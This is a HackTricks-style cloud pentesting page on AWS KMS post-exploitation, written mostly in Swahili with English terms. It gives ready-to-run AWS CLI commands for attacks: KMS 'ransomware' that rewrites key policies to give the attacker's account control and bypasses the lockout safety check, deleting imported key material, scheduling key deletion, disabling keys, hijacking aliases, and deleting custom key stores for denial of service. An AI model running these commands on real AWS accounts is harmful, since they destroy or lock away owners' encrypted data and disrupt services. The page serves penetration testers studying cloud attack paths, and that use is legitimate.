# AWS - KMS Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## KMS

Kwa maelezo zaidi angalia:

{{#ref}}
../../aws-services/aws-kms-enum.md
{{#endref}}

### Encrypt/Decrypt information

`fileb://` and `file://` are URI schemes used in AWS CLI commands to specify the path to local files:

- `fileb://:` Husoma faili kwa mode ya binary, hutumika kwa kawaida kwa faili zisizo za maandishi.
- `file://:` Husoma faili kwa mode ya maandishi, kawaida hutumika kwa faili za maandishi ya kawaida, scripts, au JSON ambazo hazina mahitaji maalum ya encoding.

> [!TIP]
> Kumbuka kwamba ikiwa unataka ku-decrypt data ndani ya faili, faili lazima iweke data ya binary, sio data iliyokuwa encoded kwa base64. (fileb://)

- Using a **symmetric** key
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
- Kutumia ufunguo wa **asimetri**:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
### KMS Ransomware

Mshambulizi mwenye privileged access juu ya KMS anaweza kubadilisha sera za KMS za keys na kumweka akaunti yake kupata ufikiaji wa keys hizo, na kuondoa ufikiaji uliotolewa kwa akaunti halali.

Hivyo, watumiaji wa akaunti halali hawawezi kupata taarifa za huduma yoyote iliyokuwa imeencrypted kwa keys hizo, na hivyo kuunda ransomware rahisi lakini yenye ufanisi dhidi ya akaunti.

> [!WARNING]
> Kumbuka kwamba **AWS managed keys aren't affected** na shambulio hili; ni **Customer managed keys** pekee.

> Pia kumbuka hitaji la kutumia param **`--bypass-policy-lockout-safety-check`** (kukosekana kwa chaguo hili kwenye web console kunafanya shambulio hili liwe linawezekana tu kutoka kwenye CLI).
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
> [!CAUTION]
> Kumbuka kwamba ikiwa utabadilisha sera hiyo na kutoa ufikiaji tu kwa account ya nje, na kuka toka kwa account hiyo ya nje ukajaribu kuweka sera mpya ili **give the access back to original account, you won't be able cause the Put Polocy action cannot be performed from a cross account**.

<figure><img src="../../../images/image (77).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

Kuna njia nyingine ya kutekeleza global KMS Ransomware, ambayo ingejumuisha hatua zifuatazo:

- Unda **ufunguo mpya wenye key material** uliyoingizwa na mshambuliaji
- **Re-encrypt data za zamani** za mwathiriwa zilizokuwa zimefungwa kwa toleo la awali kwa kutumia ufunguo mpya
- **Delete the KMS key**
- Sasa mshambuliaji pekee, ambaye ana material ya ufunguo ya awali, atakuwa na uwezo wa kufungua data zilizofichwa

### Delete Keys via kms:DeleteImportedKeyMaterial

Kwa ruhusa ya `kms:DeleteImportedKeyMaterial`, mhusika anaweza kufuta imported key material kutoka kwa CMKs zenye `Origin=EXTERNAL` (CMKs ambazo zimetumia imported key material), na kuwafanya wasiweze kufungua data. Kitendo hiki ni cha uharibifu na hakiwezi kurekebishwa isipokuwa material inayolingana iingizwe tena, na kumruhusu mshambuliaji kusababisha kwa ufanisi upotevu wa data unaofanana na ransomware kwa kufanya taarifa zilizofichwa zisipatikane kabisa.
```bash
aws kms delete-imported-key-material --key-id <Key_ID>
```
### Haribu funguo

Kwa kuharibu funguo, inawezekana kutekeleza DoS.
```bash
# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
> [!CAUTION]
> Kumbuka kuwa AWS sasa **inazuia vitendo vya awali kufanywa kutoka cross account:**

### Badilisha au futa Alias
Shambulio hili huondoa au kuelekeza upya AWS KMS aliases, ukivuruga key resolution na kusababisha kushindwa mara moja kwa huduma yoyote inayotegemea aliases hizo, na hivyo kusababisha denial-of-service. Kwa ruhusa kama `kms:DeleteAlias` au `kms:UpdateAlias` mshambuliaji anaweza kuondoa au kuelekeza tena aliases na kuharibu cryptographic operations (e.g., encrypt, describe). Huduma yoyote inayorejelea alias badala ya key ID inaweza kushindwa hadi alias itakaporudishwa au kupangwa upya kwa usahihi.
```bash
# Delete Alias
aws kms delete-alias --alias-name alias/<key_alias>

# Update Alias
aws kms update-alias \
--alias-name alias/<key_alias> \
--target-key-id <new_target_key>
```
### Kusitisha Ufutaji wa Funguo
Kwa ruhusa kama `kms:CancelKeyDeletion` na `kms:EnableKey`, mhusika anaweza kusitisha ufutaji uliopangwa wa AWS KMS customer master key na baadaye kuiwezesha tena. Kufanya hivyo kunarudisha funguo (mwanzoni katika Disabled state) na kurejesha uwezo wake wa ku-decrypt data iliyokuwa imehifadhiwa awali, na hivyo kuruhusu exfiltration.
```bash
# Firts cancel de deletion
aws kms cancel-key-deletion \
--key-id <Key_ID>

## Second enable the key
aws kms enable-key \
--key-id <Key_ID>
```
### Disable Key
Kwa ruhusa ya `kms:DisableKey`, mshambuliaji anaweza kuzima AWS KMS customer master key, kuizuia kutumika kwa encryption au decryption. Hii inavunja ufikiaji kwa huduma zozote zinazotegemea CMK hiyo na inaweza kusababisha usumbufu wa mara moja au denial-of-service hadi key iruhusiwe tena.
```bash
aws kms disable-key \
--key-id <key_id>
```
### Kupata Siri Iliyoshirikiwa
Kwa ruhusa ya `kms:DeriveSharedSecret`, mhusika anaweza kutumia funguo binafsi iliyohifadhiwa kwenye KMS pamoja na funguo ya umma iliyotolewa na mtumiaji ili kuhesabu siri ya ECDH iliyoshirikiwa.
```bash
aws kms derive-shared-secret \
--key-id <key_id> \
--public-key fileb:///<route_to_public_key> \
--key-agreement-algorithm <algorithm>
```
### Impersonation via kms:Sign
Kwa ruhusa ya `kms:Sign`, mhusika anaweza kutumia CMK iliyohifadhiwa kwenye KMS kusaini data kwa njia ya kriptografia bila kufichua private key, akitengeneza signatures halali zinazoweza kuwezesha impersonation au kuidhinisha vitendo vibaya.
```bash
aws kms sign \
--key-id <key-id> \
--message fileb://<ruta-al-archivo> \
--signing-algorithm <algoritmo> \
--message-type RAW
```
### DoS with Custom Key Stores
Kwa ruhusa kama `kms:DeleteCustomKeyStore`, `kms:DisconnectCustomKeyStore`, au `kms:UpdateCustomKeyStore`, mhusika anaweza kubadilisha, kutenganisha, au kufuta AWS KMS Custom Key Store (CKS), na kufanya master keys zake zisifanye kazi. Hiyo inavunja encryption, decryption, na signing operations kwa huduma yoyote inayotegemea funguo hizo na inaweza kusababisha mara moja denial-of-service. Kwa hivyo, ni muhimu kuzuia na kufuatilia ruhusa hizo.
```bash
aws kms delete-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms disconnect-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID>

aws kms update-custom-key-store --custom-key-store-id <CUSTOM_KEY_STORE_ID> --new-custom-key-store-name <NEW_NAME> --key-store-password <NEW_PASSWORD>
```
<figure><img src="../../../images/image (76).png" alt=""><figcaption></figcaption></figure>

{{#include ../../../../banners/hacktricks-training.md}}
